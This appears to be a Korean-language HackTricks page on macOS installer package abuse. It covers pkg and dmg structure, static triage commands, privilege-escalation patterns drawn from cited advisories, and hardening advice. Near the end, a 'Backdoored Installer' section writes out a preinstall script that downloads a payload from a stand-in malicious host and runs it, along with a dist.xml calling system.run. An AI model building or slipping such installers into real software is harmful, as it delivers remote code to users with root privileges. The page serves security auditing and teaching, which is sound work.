# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg 기본 정보

macOS **installer package**(또는 `.pkg` 파일이라고도 함)는 macOS에서 **software를 배포**하는 데 사용되는 파일 형식입니다. 이러한 파일은 software가 올바르게 설치되고 실행되는 데 필요한 **모든 것을 포함하는 상자**와 같습니다.

package file 자체는 **대상** 컴퓨터에 설치될 **파일과 디렉터리 계층 구조**를 포함하는 archive입니다. 또한 configuration file 설정이나 이전 software 버전 정리와 같이 설치 전후에 작업을 수행하는 **scripts**를 포함할 수도 있습니다.

### Package Structure

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: 사용자 지정 설정(title, welcome text…) 및 script/installation checks
- **PackageInfo (xml)**: 정보, 설치 요구 사항, 설치 위치, 실행할 scripts의 경로
- **Bill of materials (bom)**: file permissions와 함께 설치, 업데이트 또는 제거할 파일 목록
- **Payload (CPIO archive gzip compressed)**: PackageInfo의 `install-location`에 설치할 파일
- **Scripts (CPIO archive gzip compressed)**: 실행을 위해 temp directory로 추출되는 pre 및 post install scripts와 추가 resources

### 압축 해제
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
설치 프로그램의 압축을 수동으로 해제하지 않고도 내용을 확인하려면 무료 도구인 [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)도 사용할 수 있습니다.

### 정적 triage 단축 방법

분석이 목적이라면 먼저 `Installer.app`으로 package를 여는 것을 **피하도록** 하세요. 일부 package는 Installer가 열리자마자 code를 실행할 수 있습니다(예: `system.run()` 또는 installer plug-ins를 통해). 따라서 일반적으로 offline extraction부터 시작하는 것이 더 안전합니다.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG 기본 정보

DMG 파일 또는 Apple Disk Images는 Apple의 macOS에서 disk image에 사용되는 파일 형식입니다. DMG 파일은 본질적으로 **mountable disk image**(자체 filesystem 포함)이며, 일반적으로 압축되고 때로는 암호화된 raw block data를 포함합니다. DMG 파일을 열면 macOS가 이를 **물리적 disk인 것처럼 mount**하므로 해당 콘텐츠에 액세스할 수 있습니다.

> [!CAUTION]
> **`.dmg`** installers는 **너무 많은 형식**을 지원하므로, 과거에는 취약점이 포함된 일부 형식이 악용되어 **kernel code execution**을 얻는 데 사용되었습니다.

### Disk Image Structure

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 파일의 hierarchy는 콘텐츠에 따라 다를 수 있습니다. 그러나 application DMG의 경우 일반적으로 다음 구조를 따릅니다.

- Top Level: disk image의 root입니다. 일반적으로 application과 Applications folder에 대한 link가 포함됩니다.
- Application (.app): 실제 application입니다. macOS에서 application은 일반적으로 application을 구성하는 여러 개별 file과 folder가 포함된 package입니다.
- Applications Link: macOS의 Applications folder에 대한 shortcut입니다. 이를 사용하는 목적은 application을 쉽게 install할 수 있도록 하는 것입니다. `.app` file을 이 shortcut으로 drag하여 app을 install할 수 있습니다.

## pkg abuse를 통한 Privesc

### public directories에서의 실행

pre- 또는 post-installation script가 **`/var/tmp/Installerutil`**과 같은 file을 실행하고 attacker가 해당 file을 교체할 수 있다면, installer가 이를 invoke할 때 attacker는 privileges를 escalate할 수 있습니다. 인용된 talks와 walkthrough는 이러한 안전하지 않은 external-script pattern의 변형을 보여 줍니다.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

이는 여러 installer와 updater가 **root로 무언가를 execute**하기 위해 호출하는 [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)입니다. 이 function은 **execute**할 **file**의 **path**를 parameter로 받지만, attacker가 이 file을 **modify**할 수 있다면 root 권한으로 실행되는 과정을 **abuse**하여 **privileges를 escalate**할 수 있습니다.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
자세한 내용은 다음 강연을 확인하세요: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment 및 shebang abuse

최신 PackageKit 버그는 installer script가 공격자가 제어하는 context를 가까이에 둔 상태에서도 **trusted root code**로 실행되는 경우가 많다는 점을 보여주었습니다. vendor package를 audit할 때는 다음 항목에 특히 주의하세요:

- `#!/bin/zsh` / `#!/bin/bash`와 같은 Shell interpreter
- `sudo -u $USER`, `launchctl asuser`와 같은 호출 또는 `$USER`, `$HOME`, `PATH`, `TMPDIR`이나 relative path를 신뢰하는 모든 logic
- 사용자 제어 init file 또는 library를 로드할 수 있는 non-shell interpreter
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024년 PackageKit root-environment 버그(`~/.zshenv` / `~/.bash*`가 사용자가 시작한 설치 과정에서 상속되는 문제)는 [generic macOS privesc page](../macos-privilege-escalation.md)를 확인하세요. 패키지가 **Apple-signed**인 경우, `system_installd`가 `com.apple.rootless.install.heritable`을 포함할 수 있으므로 동일한 스크립트 버그가 **SIP/TCC-relevant** 문제가 될 수 있습니다. 자세한 내용은 [SIP page](../macos-security-protections/macos-sip.md)를 참조하세요.<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### 상태 기반 입력과 암시적 콜백

명백한 command injection에만 검토 범위를 제한하지 마세요. root `preinstall`/`postinstall`은 **설치 전에 이미 존재하던 상태**(예측 가능한 `/tmp` 또는 `/var/tmp`의 파일, 기존 사용자 쓰기 가능한 installation tree, configuration files, repository metadata, 또는 이후 `chown`에 전달되는 username)를 사용하는 경우 trust boundary를 넘을 수 있습니다.<sup>[[9]](#references)[[10]](#references)</sup>

최근 두 가지 Homebrew installer 취약점은 재사용 가능한 변형을 보여 줍니다.

- **공격자가 선택한 소유권:** package-user override가 소유자, mode, ACL, symlink 상태 또는 출처를 검증하지 않은 채 예측 가능한 `/var/tmp/.homebrew_pkg_user.plist`에서 읽혔습니다. 낮은 권한의 사용자는 자신의 account를 선택할 수 있었고, 이후 root `postinstall`이 Homebrew tree와 cache의 소유권을 재귀적으로 해당 사용자에게 이전했습니다. 이는 shell injection이 아니라 privilege-assignment flaw였습니다.<sup>[[9]](#references)</sup>
- **기존 tree에서 발생하는 tool callback:** root `postinstall`이 의도적으로 일반 사용자에게 writable하게 설정된 installation 내부에서 `git checkout`을 실행했습니다. 따라서 실행 가능한 `.git/hooks/post-checkout`을 심어 두면 이후 GUI/MDM package upgrade를 root code execution으로 전환할 수 있었습니다. Intel 경로에서는 packaged `.git` directory를 기존 repository에 병합하는 과정에서 공격자가 추가한 hooks도 보존되었습니다.<sup>[[10]](#references)</sup>

두 번째 primitive는 authorized test 중 쉽게 모델링할 수 있지만, trigger는 취약한 privileged installer가 이후 hook-capable Git operation을 실행할 때만 발생합니다.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
중첩된 패키지를 확장하고, 모든 공격자 제어 소스를 권한 있는 sink에 매핑합니다. 직접 실행뿐 아니라 parser, 소유권 변경, plug-in/hook 메커니즘을 사용하는 도구도 검색합니다.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
보안을 강화하려면 권한이 필요한 입력을 root 소유의 staging directory로 이동하고, 사용 직전에 각 경로가 일반 파일인지, 예상된 소유자/모드인지, 안전하지 않은 ACL이 없는지, symlink traversal이 없는지 검증하세요. 신뢰할 수 없는 identity에서 소유권을 재귀적으로 변경하지 마세요. 기존 tree에서 Git을 실행해야 하는 경우 callback을 명시적으로 비활성화하거나(예: `git -c core.hooksPath=/dev/null ...`) Git을 호출하기 전에 repository metadata를 원자적으로 교체하세요.<sup>[[9]](#references)[[10]](#references)</sup>

### Mount를 통한 실행

installer가 `/tmp/fixedname/bla/bla`에 기록한다면, `/tmp/fixedname` 위에 noowners로 **mount를 생성**하여 **installation 중 모든 파일을 수정**하고 installation process를 악용할 수 있습니다.

그 예가 **CVE-2021-26089**이며, 이를 통해 **periodic script를 덮어써서** root 권한으로 실행할 수 있었습니다. 자세한 내용은 다음 발표를 참고하세요: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg를 malware로 사용

### 빈 Payload

실제 payload 없이 scripts 내부의 malware만 포함한 **pre 및 post-install scripts**가 있는 **`.pkg`** 파일을 생성할 수 있습니다.<sup>[[2]](#references)</sup>

### Distribution xml의 JS

package의 **distribution xml** 파일에 **`<script>`** tags를 추가할 수 있으며, 해당 code가 실행되어 **`system.run`**을 사용해 **commands를 실행**할 수 있습니다:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Distribution packages에서는 일반적으로 최상위 `Distribution` 파일이 `allow-external-scripts="true"`와 같이 external scripts를 활성화하는지에 따라 달라집니다. 따라서 `preinstall` / `postinstall`만 검토하는 것으로는 충분하지 않습니다. **Distribution XML 자체**에 `installation-check` / `volume-check` hooks 및 직접적인 `system.run()` / `system.runOnce()` execution paths가 포함될 수 있습니다.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Backdoored Installer

dist.xml 내부에서 script와 JS code를 사용하는 악성 installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Pkgs Unpacking: macOS Installer Packages 내부 살펴보기 및 일반적인 Security Flaws](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "macOS Installers의 Wild World" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Pkgs Unpacking: macOS Installer Packages 내부 살펴보기](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Installer Packages Exploiting](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Apple-signed Packages로 SIP Breaking](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS에서 1000개의 Installers로 인한 Death, 그리고 모든 것이 Broken!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Homebrew macOS installer가 user-controlled package-user plist를 신뢰](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [macOS PKG postinstall의 Git hooks를 통한 Root code execution](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
